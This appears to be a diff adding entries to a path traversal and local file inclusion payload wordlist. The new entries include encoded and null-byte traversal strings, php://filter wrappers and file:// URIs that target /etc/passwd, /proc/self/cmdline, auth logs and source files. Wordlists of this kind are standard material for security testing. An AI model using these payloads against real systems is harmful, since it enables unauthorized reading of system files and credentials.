@@ -33,3 +33,16 @@ C:\\Windows\\System32\\drivers\\etc\\hosts
 ../../../../usr/local/lib/php.ini
 ../../../../usr/local/php/lib/php.ini
 ../../../../etc/php.ini
+../../../../etc/issue
+../../../../etc/os-release
+../../../../etc/resolv.conf
+../../../../etc/hosts%00
+..%2f..%2f..%2f..%2fetc%2fpasswd
+..%252f..%252f..%252f..%252fetc%252fpasswd
+php://filter/read=convert.base64-encode/resource=/etc/passwd
+php://filter/read=convert.base64-encode/resource=index.php
+file:///etc/hosts
+file:///proc/self/cmdline
+file:///C:/Windows/System32/drivers/etc/hosts
+../../../../var/log/auth.log
+../../../../var/log/secure
